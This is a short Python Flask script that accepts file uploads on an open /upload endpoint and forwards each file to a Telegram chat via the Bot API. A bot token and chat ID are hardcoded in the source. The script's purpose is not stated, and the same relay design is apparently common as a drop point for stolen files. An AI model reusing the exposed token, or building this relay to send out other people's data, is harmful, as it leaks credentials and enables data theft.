from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8620142253:AAH8TFYy219PdSiRaVx6et_WE04alYjXaVk"
CHAT_ID = "6315170436"

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

    requests.post(url, data={"chat_id": CHAT_ID},
                  files={"document": file})

    return "OK"

app.run(host="0.0.0.0", port=5000)
